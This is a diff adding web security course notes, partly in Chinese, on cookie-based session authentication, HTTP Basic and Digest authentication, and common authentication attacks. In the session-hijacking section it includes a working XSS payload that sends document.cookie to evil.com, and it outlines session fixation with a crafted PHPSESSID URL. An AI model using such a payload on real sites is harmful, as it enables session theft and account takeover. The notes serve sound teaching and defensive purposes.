@@ -203,8 +203,137 @@ Hash based Message Authentication Code (HMAC)
 
 ## Authentication Token & Authorization
 
-- Authenticate the token before admin operations
-- 
+Authenticate the token before admin operations
+
+- The cookie value is "signed" with the provided secret
+- A tampered value will mismatch with the "signature"
+- Attacker cannot generate the corresponding "signature" without secret
+- (Precisely, it is message authentication code, not signature)
+
+Authorization check before admin operations
+
+- Only upon a successful login
+- req.session.username and req.session.admin are set according to DB
+
+For subsequent requests,
+
+- req.session.username accessible means logged-in user
+- req.session.admin accessible means a logged-in admin user
+
+::: tip Best Practice on Session Isolation
+
+We often separate auth cookies from other session cookies -> connection sessionId (expires = 3 mths) and auth (expires: 180s)
+
+Authentication Cookies
+
+- auth should be configured with tighter security
+- secure (i.e., https only)
+- httpOnly (i.e., no JS access)
+- path (restricted to a specific folder)
+- Expire more often
+
+General Session Cookies
+
+- Associated with less critical data
+- Some can be stored in localStorage at client side
+
+:::
+
+## Security Issues regarding Cookie Auth.
+
+Session Hijacking: Stealing cookies with XSS attacks
+
+```
+<img src="404" onerror="this.src='//evil.com/'+escape(document.cookie)"/>
+```
+
+Attacker presents the stolen cookies to impersonate a victim
+
+- Mitigation 1: Reduce the risk by making cookie expire sooner
+- Mitigation 2: Set the flag HttpOnly for your cookies
+
+Session Fixation: Forcing session id designed by attackers
+
+- Cause: A vulnerable website let its user determine session id
+- Some vulnerable systems allow user input as session id
+- Attacker sends a URL with a custom PHPSESSID to a victim
+- Victim visits the URL and login using the particular session
+- Attacker visits the same URL and hijacks the session
+- Mitigation: Change the session id upon login
+
+```
+攻击者生成一个特定的「PHPSSESSID」，例如“123456”。
+攻击者构建一个带有自定义「PHPSSESSID」的URL，例如“http://example.com/login.php?PHPSESSID=123456”。
+攻击者通过电子邮件或其他方式发送该URL给受害者。
+受害者点击该URL并登录电子商务网站。
+网站使用攻击者设置的「PHPSSESSID」创建「session」并保持受害者的登录状态。
+攻击者访问同一个URL并劫持该「session」，从而能够访问受害者的账户。
+```
+
+## HTTP (Basic) Authentication
+
+- The standardized and traditional way to authenticate a user
+- Not favorable by commercial websites since it's not customizable
+- Use this over HTTPs (sensitive data are not protected in HTTP)
+
+![1744105328170.png](https://pic.hanjiaming.com.cn/2025/04/08/e2ac42aae7576.png)
+
+- Realm: protection space (diff. page, same space).
+- With Nginx: + apache2-util to create password file.
+- With Node: Set headers, or use package express-basic-auth
+- MDN: HTTP Authentication
+
+## HTTP (Digest) Authentication
+
+![1744105730206.png](https://pic.hanjiaming.com.cn/2025/04/08/c0d78315ef07e.png)
+
+```
+eg.
+
+用户输入用户名和密码。
+客户端发送初始请求，服务器返回401 Unauthorized状态码，并提供摘要认证参数（nonce、realm、opaque等）。
+客户端使用用户名、密码、nonce、请求URI等参数计算HA1和HA2：
+HA1 = MD5(username: realm: password)
+HA2 = MD5(method: digestURI)
+客户端使用HA1、nonce、nonceCount、clientNonce、qop和HA2计算response哈希值：
+response = MD5(HA1: nonce: nonceCount: clientNonce: qop: HA2)
+客户端发送带有认证信息的请求，包括用户名、realm、nonce、uri、response等参数。
+服务器验证response哈希值，如果匹配，则允许访问资源。
+```
+
+## General Authentication Attacks
+
+- Brute force Dictionary -> enumerating possible passwords
+- Eavesdropping and Session Hijacking「窃听和会话劫持」
+  - reading the password in plaintext protocol
+  - replaying captured session token (or if it can be easily guessed)
+- Shoulder surfing: looking over shoulders when entering password
+- Phishing (Nowadays' threats) -> providing a fake webpage to lure genuine password
+- Time-of-check to Time-of-use (TOCTTOU)
+  - Race condition between the checking and actual usage.
+  - e.g., taking over by unauthorized person after authentication (e.g., login)
+- Others...(Broken Access Control makes authentication scheme useless)
+
+::: info Enforce Proper Password Strength (incl. length, complexity) (check NIST 800-63)
+
+TOCTTOU是一种竞态条件漏洞，发生在系统检查某个条件与实际使用资源之间的时间间隙。攻击者可能利用这个时间间隙进行恶意操作。例如，系统在检查用户权限后，攻击者在实际使用资源前改变了资源的状态，从而绕过权限检查。
+
+eg. 
+
+1. 用户提交转账请求，系统检查用户是否具有转账权限。
+2. 权限检查通过后，系统准备执行转账操作。
+3. 在执行转账操作前，攻击者修改转账请求的目标账户。
+4. 系统执行转账操作，将资金转移到攻击者的账户。
+
+:::
+
+## Best Practices of Password Authentication
+
+
+
+
+
+
 
 
 
